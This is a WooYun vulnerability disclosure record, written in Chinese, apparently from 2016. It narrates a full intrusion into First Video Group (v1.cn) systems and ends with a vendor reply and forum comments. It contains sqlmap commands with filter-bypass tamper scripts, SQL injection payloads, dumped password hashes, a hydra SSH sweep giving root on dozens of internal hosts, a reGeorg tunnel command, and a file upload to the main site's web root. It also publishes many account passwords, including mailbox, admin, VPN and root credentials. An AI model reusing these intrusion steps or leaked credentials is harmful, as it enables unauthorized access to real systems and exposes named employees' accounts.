{"id": 74072, "wybug_id": "wooyun-2016-0166852", "wybug_title": "第一视频集团内网漫游(60台Linux已root/780w游戏用户/获取www主站权限)", "wybug_corp": "第一视频", "wybug_author": "hecate", "wybug_date": "2016-01-02 18:42", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： 第一视频集团旗下v1.cn，中国足彩网，彩票365，第一游戏网奇虎360某工程师中枪 详细说明：  1.入口 http://mail.v1.cn/使用双拼字典 http://zone.wooyun.org/content/23175 以pitchfork形式对邮箱进行fuzzing，得到弱口令用户，然后登录邮箱脱出所有用户名再一次进行fuzz，得到如下结果\nzhangjingyi\tzhangjingyi@123zhangzhongkun\tzhangzhongkun@123lijie\t        lijie@123zhangjiaquan\tzhangjiaquan@123jinlijing\tjinlijing@123wushiqiang\twushiqiang@123zhouxulong\tzhouxulong@123wanglimei\twanglimei@123sundong\t        sundong@123weiwei\t        weiwei@123guohao\t        guohao@123ychr\t        ychr@123fencheng\tfencheng@123renzheng\trenzheng@123v1boreport\tv1boreport@123security\tsecurity@123caichengqi\tcaichengqi@123caikunhao\tcaikunhao@123changli        \tchangli@123chenshuai\tchenshuai@123chenying\tchenying@123chenyushuang\tchenyushuang@123chenghengyan\tchenghengyan@123dingjingshun\tdingjingshun@123dongbaojun\tdongbaojun@123dongwenying\tdongwenying@123fanxue\t        fanxue@123feijiuling\tfeijiuling@123houhaidong\thouhaidong@123hujing01\thujing01@123cphunan\t        cphunan@123hudongyule\thudongyule@123huanghuanhuan\thuanghuanhuan@123huitai\t        huitai@123huishuai\thuishuai@123huobaoqiang\thuobaoqiang@123jiaojingjing\tjiaojingjing@123jiaoxiaoxue\tjiaoxiaoxue@123kongpeng\tkongpeng@123lidi\t        lidi@123lifangfang\tlifangfang@123liguohe        \tliguohe@123lihe\t        lihe@123lijinxin\tlijinxin@123lilingyun\tlilingyun@123liyang\t        liyang@123liyongliang\tliyongliang@123lizhen\t        lizhen@123liujunhao\tliujunhao@123liuqiang\tliuqiang@123liushengtao\tliushengtao@123liushuhan\tliushuhan@123liuxiaoyu\tliuxiaoyu@123liuyanxia\tliuyanxia@123liuzhiyao\tliuzhiyao@123liuzhongming\tliuzhongming@123luyanlong\tluyanlong@123lvlili\t        lvlili@123lvmin\t        lvmin@123lvnanjun\tlvnanjun@123matian\t        matian@123maoqibing\tmaoqibing@123nichong\t        nichong@123niejie\t        niejie@123niuyue\t        niuyue@123peiliying\tpeiliying@123qisonghai\tqisonghai@123quyiwei\t        quyiwei@123shangchenwei\tshangchenwei@123shiyang\t        shiyang@123sunaili\t        sunaili@123sunzhimin\tsunzhimin@123wanghong\twanghong@123wangjiao\twangjiao@123wangjun         wangjun@123wanglingling\twanglingling@123照片wangshubing\twangshubing@123wangxiaowei\twangxiaowei@123wangyaodong\twangyaodong@123wangzhongyu\twangzhongyu@123weiman\t        weiman@123wuqiuqiang\twuqiuqiang@123xiangchao\txiangchao@123develop\t        develop@123xuluning\txuluning@123xuebing\t        xuebing@123yanerkang\tyanerkang@123yangwei\t        yangwei@123yangxi\t        yangxi@123yangyonggang\tyangyonggang@123yangyunda\tyangyunda@123yinhuiting\tyinhuiting@123youle\t        youle@123ylgx\t        ylgx@123tianxianpei\ttianxianpei@123v1gamekefu\tv1gamekefu@123yuanchao\tyuanchao@123xunuo\t        xunuo@123zhangbo01\tzhangbo01@123zhanggaofan\tzhanggaofan@123zhangjianyang\tzhangjianyang@123zhangjingli\tzhangjingli@123zhangrong\tzhangrong@123zhangxuelun\tzhangxuelun@123zhangyi\t        zhangyi@123zhangyuanyuan\tzhangyuanyuan@123zhaohaixia\tzhaohaixia@123zhaolin\t        zhaolin@123zhaoxueying\tzhaoxueying@123zhengyunxue\tzhengyunxue@123zhonghua\tzhonghua@123zhouchunying\tzhouchunying@123zhujing        \tzhujing@123zongbianshi\tzongbianshi@123zoujieqi\tzoujieqi@123zuoweizhen\tzuoweizhen@123\n2.挨个登录邮箱收集信息，密码不少\nV1游戏中心管理后台地址：http://pay.g.v1.cn/Z8Ex1iB5/adminLogin 一级账号密码：v1game     b3&|EE二级账号密码：sunyonghou     sunyonghou\n一级账号通过了401认证，但是登录后台却密码错误，然后试试弱口令\nliujunhao\t123456xiaoxiang\t123123wangshuai\t123123yuanchao\t123456luozhao\t\t123456liyang\t\t123123niejie\t\t123123wanghong        wanghong\n随便登录一个\n\n788万用户\n\n\n彩票365微信公众账号密码已修改，具体如下，请知悉，谢谢！微信公众平台 http://mp.weixin.qq.com账号：caipiao365@qq.com密码：ycygcp#^%\n\n\n第一彩后台 http://cms.diyicai.com/cms/太多弱口令\nfengchao\t123456wangpeng\t123456lixiao          lixiao123changli         changli@123zhangguangchuan caibo2013ceshibianji     editor2013\n\n\n域名劫持\n\n3.邮箱里面搜索vpn\nvpn账号  guohao       密码GUO@vodone\n拨入vpn，进入内网\n\nwindows下意外发现某3389弱口令为 111\n\n还开着360云盘，看了下牛逼的个人简历\n\n奇虎360工程师中枪~~再回到linux下面，先对内网80端口进行探测，发现主要存活主机在192.168.5和192.168.9段\n\n一个废旧的办公系统存在大量弱口令，没找到有用的东西直到找到另一个废站 http://192.168.9.105/搜索框加单引号报错\n\nsqlmap跑不出数据库，发现过滤了 > 符号，使用between替换\nsqlmap -u \"http://192.168.9.105/index.php?ctl=deals&k=\" -p \"k\" --dbs --tamper between.py\n\n\n跑出了库又跑不出表，加载多个脚本再一次绕过过滤\nsqlmap -u \"http://192.168.9.105/index.php?ctl=deals&k=\" -p \"k\" -D \"v1zhongchou\" --count --tamper equaltolike.py,between.py,randomcase.py,space2comment.py --threads 5Database: v1zhongchouTable: fanwe_admin[1 entry]+----------+----------------------------------+----+| adm_name | adm_password                     | id |+----------+----------------------------------+----+| admin    | 202cb962ac59075b964b07152d234b70 | 1  |+----------+----------------------------------+----+\n解密后登录后台，还可执行sql语句直接拿shell\n\n\n\n没找到其他站点，继续探测同网段IP,找到这个后台 http://cms.v1cn/\n\n并没有对外网解析fuzz弱口令，多数密码为123456，登陆后发现注入点\nhttp://cms.v1cn/focus/focus/ (POST)cid=1000&title=&realname=Parameter: realname (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cid=1000&title=&realname=%' AND 6721=6721 AND '%'='Parameter: title (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cid=1000&title=%' AND 8956=8956 AND '%'='&realname=    Type: stacked queries    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)    Payload: cid=1000&title=%';(SELECT * FROM (SELECT(SLEEP(5)))FUnQ)#&realname=---web application technology: PHP 5.6.8back-end DBMS: MySQL 5.0.11\n结果是root权限\ndatabase management system users password hashes:[*] cms [1]:    password hash: *A5C1E017AC4909CF2658F951F093855F6EBF8AE7[*] debian-sys-maint [1]:    password hash: *64931C7647F69D23E93C5B307D559ADD125AAECB[*] report [1]:    password hash: *8E2B5A8BF835E14935C5C7F3ADE1022CE13A371F[*] root [2]:    password hash: *06639D44E608EECBDA08F815172DEE51FDD424D8    password hash: *1DBEB20659BE17A3D575ACFAF216A4154C6EF1D0[*] v1boslave [1]:    password hash: *35BC47EE0DCC18C5F034900CC52FF5EDDDAE0D39[*] v1cmstmp [1]:    password hash: *DB07F0E31219CFBA057CCBDD5C5045EE53EFCDE6\n解密root密码尝试登录服务器\nroot   v1vodone\n登陆成功\n\n原来只是个反向代理服务器，找不到主域名在哪\n\n4.使出hydra以 v1vodone 作为通用密码对网段22端口进行fuzzing，结果是令人欣慰的\n[22][ssh] host: 192.168.5.15   login: root   password: v1vodone[22][ssh] host: 192.168.5.3   login: root   password: v1vodone[22][ssh] host: 192.168.5.2   login: root   password: v1vodone[22][ssh] host: 192.168.5.5   login: root   password: v1vodone[22][ssh] host: 192.168.5.36   login: root   password: v1vodone[22][ssh] host: 192.168.5.75   login: root   password: v1vodone[22][ssh] host: 192.168.5.73   login: root   password: v1vodone[22][ssh] host: 192.168.5.96   login: root   password: v1vodone[22][ssh] host: 192.168.5.173   login: root   password: v1vodone[22][ssh] host: 192.168.5.172   login: root   password: v1vodone[22][ssh] host: 192.168.9.50   login: root   password: v1vodone[22][ssh] host: 192.168.9.21   login: root   password: v1vodone[22][ssh] host: 192.168.9.33   login: root   password: v1vodone[22][ssh] host: 192.168.9.49   login: root   password: v1vodone[22][ssh] host: 192.168.9.18   login: root   password: v1vodone[22][ssh] host: 192.168.9.35   login: root   password: v1vodone[22][ssh] host: 192.168.9.107   login: root   password: v1vodone[22][ssh] host: 192.168.9.53   login: root   password: v1vodone[22][ssh] host: 192.168.9.102   login: root   password: v1vodone[22][ssh] host: 192.168.9.130   login: root   password: v1vodone[22][ssh] host: 192.168.9.51   login: root   password: v1vodone[22][ssh] host: 192.168.9.128   login: root   password: v1vodone[22][ssh] host: 192.168.9.56   login: root   password: v1vodone[22][ssh] host: 192.168.9.110   login: root   password: v1vodone[22][ssh] host: 192.168.9.125   login: root   password: v1vodone[22][ssh] host: 192.168.9.131   login: root   password: v1vodone[22][ssh] host: 192.168.9.106   login: root   password: v1vodone[22][ssh] host: 192.168.9.132   login: root   password: v1vodone[22][ssh] host: 192.168.9.105   login: root   password: v1vodone[22][ssh] host: 192.168.9.129   login: root   password: v1vodone[22][ssh] host: 192.168.9.109   login: root   password: v1vodone[22][ssh] host: 192.168.9.152   login: root   password: v1vodone[22][ssh] host: 192.168.9.153   login: root   password: v1vodone[22][ssh] host: 192.168.9.151   login: root   password: v1vodone[22][ssh] host: 192.168.9.160   login: root   password: v1vodone[22][ssh] host: 192.168.9.195   login: root   password: v1vodone[22][ssh] host: 192.168.9.171   login: root   password: v1vodone[22][ssh] host: 192.168.9.197   login: root   password: v1vodone[22][ssh] host: 192.168.9.238   login: root   password: v1vodone[22][ssh] host: 192.168.9.223   login: root   password: v1vodone[22][ssh] host: 192.168.9.216   login: root   password: v1vodone[22][ssh] host: 192.168.9.206   login: root   password: v1vodone\n真是呵呵了！但是仍找不到主域名在哪，ping主域名只返回外网地址，然后查看hosts\ncat /etc/hosts\n\n\n由此判断主要域名应在10网段，vpn拨进来的地址在 192.168.5段的办公网络，扫描10网段没发现存活主机，应该是被隔离了;但是192.168.9段的服务器可以ping通10网段，so可以以此为跳板进入到生产网络，nginx作正向代理不好使，而且不支持https这时用到了内网的第一个shell，reGeorg+proxychains作为代理\npython reGeorgSocksProxy.py -p 9527 -u http://192.168.9.105/tunnel.php\n然后继续用通用密码对10.20.1.1/24网段进行fuzz，结果不出所料\n[22][ssh] host: 10.20.1.57   login: root   password: v1vodone[22][ssh] host: 10.20.1.54   login: root   password: v1vodone[22][ssh] host: 10.20.1.55   login: root   password: v1vodone[22][ssh] host: 10.20.1.83   login: root   password: v1vodone[22][ssh] host: 10.20.1.51   login: root   password: v1vodone[22][ssh] host: 10.20.1.119   login: root   password: v1vodone[22][ssh] host: 10.20.1.115   login: root   password: v1vodone[22][ssh] host: 10.20.1.114   login: root   password: v1vodone[22][ssh] host: 10.20.1.196   login: root   password: v1vodone[22][ssh] host: 10.20.1.194   login: root   password: v1vodone[22][ssh] host: 10.20.1.190   login: root   password: v1vodone[22][ssh] host: 10.20.1.163   login: root   password: v1vodone[22][ssh] host: 10.20.1.195   login: root   password: v1vodone[22][ssh] host: 10.20.1.164   login: root   password: v1vodone[22][ssh] host: 10.20.1.212   login: root   password: v1vodone[22][ssh] host: 10.20.1.217   login: root   password: v1vodone[22][ssh] host: 10.20.1.209   login: root   password: v1vodone[22][ssh] host: 10.20.1.216   login: root   password: v1vodone[22][ssh] host: 10.20.1.221   login: root   password: v1vodone[22][ssh] host: 10.20.1.213   login: root   password: v1vodone[22][ssh] host: 10.20.1.220   login: root   password: v1vodone[22][ssh] host: 10.20.1.230   login: root   password: v1vodone[22][ssh] host: 10.20.1.222   login: root   password: v1vodone[22][ssh] host: 10.20.1.211   login: root   password: v1vodone\n5.发现 10.20.1.17/18/19/119 这个几地址都指向主站\n\n有负载均衡，但是通用密码恰好能登录 10.20.1.119\n\n看了配置文件，主域名和二级域名都在\nNameVirtualHost *:80<VirtualHost *:80>    DocumentRoot /VODONE/www/vodone.cms/publish/vodone/    ServerName www.v1.cn    Header unset ETag    FileETag None#    <Location ~ \"/[0-9]{4}-[0-9]{2}-[0-9]{2}/\">#        ExpiresDefault \"access plus 7 days\"#    </Location>    CustomLog \"|/VODONE/server/apache/bin/rotatelogs /VODONE/logs/apache/www.v1.cn_%Y%m%d.log 86400 480\" combined    RewriteEngine on    RewriteCond %{QUERY_STRING} v=(\\d+)$    RewriteRule ^/js/video_detail.js http://www.v1.cn/js/video_detail.js? [L,R=302]    RewriteCond %{QUERY_STRING} v=.*$    RewriteRule ^/css/video_detail.css http://www.v1.cn/css/video_detail.css? [L,R=302]    RewriteCond %{QUERY_STRING} ^(\\d+)$    RewriteRule ^/player/cloud/config.xml http://www.v1.cn/player/cloud/config.xml? [L,R=302]    RewriteRule ^/(apps|news|shehui|mil|finance|sports|paike|bgt|ent|360movie|360tv|music|fun|culture|lady|auto|tech|games|life|travel|city|gongyi|special|topic)/(.*)    http://$1.v1.cn/$2  [L,R=301]    RewriteRule ^/pic/([0-9]{4})-([0-9]{2})-([0-9]{2})/([0-9]+)_[0-9]+.shtml$ /pic/$1-$2-$3/$4.shtml [L]    RewriteCond %{QUERY_STRING} ^toAlbumContent    RewriteRule ^/([0-9]{4})-([0-9]{2})-([0-9]{2})/([0-9]+).shtml$ /focusAlbum.php?req=$0 [QSA,L]</VirtualHost>#<VirtualHost *:80>#    DocumentRoot /VODONE/www/vodone.cms/publish/vodone/#    ServerName mirrors.163.com#    ProxyRequests On#    ProxyPassMatch ^/(.*)$ http://mirrors.163.com/$1#</VirtualHost><VirtualHost *:80>    DocumentRoot /VODONE/www/vodone.cms/cms/public    ServerName  g.cms.v1cn    ServerAlias  www.g.cms.v1cn    ProxyRequests On    ProxyPass /voteadmin/ http://vote.v1.cn/admin/    # Add Domains for ReverseProxy    ProxyPassReverse /voteadmin/ http://vote.v1.cn/admin/    RewriteEngine on    RewriteRule ^/voteadmin/   -  [L]    RewriteRule !\\.(js|ico|txt|gif|jpg|png|css|swf|xml|flv|html|htm)$|.*(fckeditor/editor).* /index.php</VirtualHost># httpd.conf already set \"Options -Indexes FollowSymLinks\" for /VODONE/www<Directory \"/VODONE/www/vodone.cms/work/vodone/\">        AllowOverride None        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/publish/vodone/\">        AllowOverride None        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/work/spider/\">        AllowOverride None        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/publish/spider/\">        AllowOverride None        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/work/games/\">        AllowOverride FileInfo Limit        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/publish/games/\">       AllowOverride FileInfo Limit        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/publish/h5/\">       AllowOverride FileInfo Limit        Options +Includes        Order allow,deny        Allow from all</Directory><Directory \"/VODONE/www/vodone.cms/work/h5/\">       AllowOverride FileInfo Limit        Options +Includes        Order allow,deny        Allow from all</Directory><VirtualHost *:80>    DocumentRoot /VODONE/www/vodone.cms/img/    ServerName  image.v1.cn    ServerAlias 0.image.v1.cn  1.image.v1.cn  2.image.v1.cn  3.image.v1.cn  4.image.v1.cn  5.image.v1.cn  6.image.v1.cn  7.image.v1.cn  8.image.v1.cn  9.image.v1.cn    CustomLog \"|/VODONE/server/apache/bin/rotatelogs /VODONE/logs/apache/image.v1.cn_%Y%m%d.log 86400 480\" combined</VirtualHost><VirtualHost *:80>    DocumentRoot /VODONE/www/vodone.cms/publish/vodone/    ServerName pub.cms.v1cn</VirtualHost><VirtualHost *:80>    DocumentRoot  /VODONE/www/vodone.cms/work/vodone/    ServerName  work.cms.v1cn</VirtualHost><VirtualHost *:80>    DocumentRoot  /VODONE/www/vodone.cms/work/spider/    ServerName  spider.cms.v1cn</VirtualHost>\n   漏洞证明：  \n$ proxychains scp -r connf.html root@10.20.1.119:/VODONE/www/vodone.cms/publish/vodone/\n\n\n   修复方案：  弱口令和注入太多，仅仅上传了几个脚本，没有下载任何数据；全过程没见到任何安全软件防护，贵公司毫无安全意识可言   版权声明：转载请注明来源 hecate@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-03 20:03 厂商回复： 感谢关注，请确保信息安全，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-02 18:45 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:553 漏洞数:100        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  前排围观    \n     2016-01-02 18:46 |    \t\t奶嘴 \t\t\t( 普通白帽子  |\t\t\t        Rank:130 漏洞数:36        | 16岁的毛孩)\t\t \n  前排围观 2    \n     2016-01-02 18:59 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1660 漏洞数:248        | WooYun is the Bigest gay place.  网络工...)\t\t \n  前排围观    \n     2016-01-02 19:29 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        )\t\t \n  围观    \n     2016-01-02 19:34 |    \t\tlanyan \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 求河北黑阔团队收留！)\t\t \n  你这标题要是在透露点就好了！    \n     2016-01-02 20:33 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:25        | 不是你不行、只是路不平ฏ๎๎๎๎๎๎๎๎...)\t\t \n  66666666666666666666666666666666666666∏    \n     2016-01-03 04:09 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1442 漏洞数:366        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  我猜八九不离十是爆破邮箱:)    \n     2016-01-03 10:05 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:743 漏洞数:113        | ®高级安全工程师 | WooYun认证√)\t\t \n  @小龙 那只是第一步，后面的内容更精彩    \n     2016-01-03 16:33 |    \t\t404notfound \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:61        | 天朝教育网杀神)\t\t \n  前排围观     \n     2016-01-03 17:17 |    \t\t虾米 \t\t\t( 普通白帽子  |\t\t\t        Rank:105 漏洞数:13        )\t\t \n  厂商要报警了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}